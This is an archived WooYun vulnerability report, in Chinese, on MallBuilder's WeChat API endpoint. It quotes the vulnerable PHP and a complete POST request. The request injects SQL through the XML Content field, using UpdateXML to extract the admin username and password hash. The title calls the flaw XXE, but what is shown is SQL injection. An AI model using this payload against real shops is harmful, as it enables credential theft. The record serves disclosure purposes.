{"id": 43957, "wybug_id": "wooyun-2014-081144", "wybug_title": "mallbuilder多用户商城系统XXE注入可以爆管理员用户密码", "wybug_corp": "shop-builder.cn", "wybug_author": "nextdoor", "wybug_date": "2014-10-29 12:52", "wybug_open_date": "2014-12-30 14:44", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-03：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-12-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-30：\t细节向公众公开  简要描述： mallbuilder多用户商城系统XXE注入 详细说明：  系统 MallBuilder_v5.8.1.1api/wechat.php中\n<?phpinclude_once(\"../includes/global.php\");@include_once(\"../config/wechat_config.php\");$wechat=$wechat_config['wechat']?$wechat_config['wechat']:\"\";define(\"TOKEN\", $wechat);$wechatObj = new wechatCallbackapiTest();if($_GET[\"echostr\"]&&$_GET[\"signature\"]&&$_GET[\"timestamp\"]&&$_GET[\"nonce\"])//if后的get值不存在进入else语句{  \t\t$wechatObj->valid();\t}else{    \t$wechatObj->responseMsg(); //跟踪responseMsg()函数}class wechatCallbackapiTest{\tpublic function valid()    {        $echoStr = $_GET[\"echostr\"];        if($this->checkSignature()){\t\t\techo $echoStr;        \texit;        }    }    public function responseMsg()    {  \t\t$postStr = $GLOBALS[\"HTTP_RAW_POST_DATA\"];\t\tglobal $db,$config;\t\tif (!empty($postStr)){\t\t\t                  \t$postObj = simplexml_load_string($postStr, 'SimpleXMLElement', LIBXML_NOCDATA);              \t                $fromUsername = $postObj->FromUserName;                $toUsername = $postObj->ToUserName;                    $keyword = trim($postObj->Content);                $time = time();\t\t\t\t$RX_TYPE = trim($postObj->MsgType);\t\t\t\t$num=0;\t\t\t\t\t\t\t\t$str=\"\";\t\t\t\t\t\t\t\tif($RX_TYPE=='text')//是POST的MsgType为text\t\t\t\t{  \t\t\t\t\t\t\t\t\tif(!empty($keyword))\t//在xml数据中定义Content变量\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t$sql=\"select pname,id,pic from \".PRO.\" where pname like '%$keyword%' order by id desc limit 0,4\"; //Content 进入sql语句，可以注入\t\t\t\t\t\t$db->query($sql);\t\t\t\t\t\t$re=$db->getRows();\t\t\t\t\t\tforeach($re as $val)\t\t\t\t\t\t{\t\t\t\t\t\t\t$str.=\"<item>\t\t\t\t\t\t\t\t <Title><![CDATA[\".$val['pname'].\"]]></Title> \t\t\t\t\t\t\t\t <Description><![CDATA[]]></Description>\t\t\t\t\t\t\t\t <PicUrl><![CDATA[\".$val['pic'].\"]]></PicUrl>\t\t\t\t\t\t\t\t <Url><![CDATA[\".$config['weburl'].\"?m=product&s=detail&id=\".$val['id'].\"]]></Url>\t\t\t\t\t\t\t</item>\";\t\t\t\t\t\t\t$num++;\t\t\t\t\t\t\techo \"test2\";\t\t\t\t\t\t}\t\t\t\t\t\tif($num>0)\t\t\t\t\t\t{\t\t\t\t\t\t\t$textTpl = \"<xml>\t\t\t\t\t\t\t<ToUserName><![CDATA[%s]]></ToUserName>\t\t\t\t\t\t\t<FromUserName><![CDATA[%s]]></FromUserName>\t\t\t\t\t\t\t<CreateTime>%s</CreateTime>\t\t\t\t\t\t\t<MsgType><![CDATA[news]]></MsgType>\t\t\t\t\t\t\t<ArticleCount>\".$num.\"</ArticleCount>\t\t\t\t\t\t\t<Articles>\".$str.\"</Articles>\t\t\t\t\t\t\t<FuncFlag>1</FuncFlag>\t\t\t\t\t\t\t</xml>\"; \t\t\t\t\t\t\t$msgType = \"text\";\t\t\t\t\t\t\t$contentStr = \"\";\t\t\t\t\t\t\t$resultStr = sprintf($textTpl, $fromUsername, $toUsername, $time, $msgType, $contentStr);\t\t\t\t\t\t\techo $resultStr;\t\t\t\t\t\t\t\t\t\t\t\t\t}\t\t\t\t\t}\t\t\t\t\telse\t\t\t\t\t\techo \"Input something1 \";\t\t\t\t}\t\t\t\telse{                \techo \"Input something2 \";                }        }else{        \techo \"\";        \techo \"test6\";        \texit;        }    }\tprivate function checkSignature()\t{        $signature = $_GET[\"signature\"];        $timestamp = $_GET[\"timestamp\"];        $nonce = $_GET[\"nonce\"];\t        \t\t\t\t$token = TOKEN;\t\t$tmpArr = array($token, $timestamp, $nonce);\t\tsort($tmpArr);\t\t$tmpStr = implode( $tmpArr );\t\t$tmpStr = sha1( $tmpStr );\t\t\t\tif( $tmpStr == $signature ){\t\t\treturn true;\t\t}else{\t\t\treturn false;\t\t}\t}}?>\nPOST 提交的代码\nPOST /mallbuilder/api/wechat.php HTTP/1.1Host: 127.0.0.1:8088Proxy-Connection: keep-aliveCache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36Accept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Cookie: PHPSESSID=fdb687e31fb1d9a23b1b5dc3221123f9<xml>\t\t\t\t\t\t\t<ToUserName>test1</ToUserName>\t\t\t\t\t\t\t<FromUserName>test3</FromUserName>\t\t\t\t\t\t<CreateTime>123456</CreateTime><MsgType>text</MsgType>\t\t\t\t\t\t\t<ArticleCount>11</ArticleCount><Articles>aaa</Articles><FuncFlag>0</FuncFlag><Content>test' and UpdateXML(1,CONCAT(0x5b,mid((SELECT (select concat(user,0x23,password) from mallbuilder_admin limit 1)),1,32),0x5d),1)#</Content></xml>\n   漏洞证明：  \n\n\n\n官网demo演示\n\n   修复方案：  无   版权声明：转载请注明来源 nextdoor@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-12-30 14:44 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}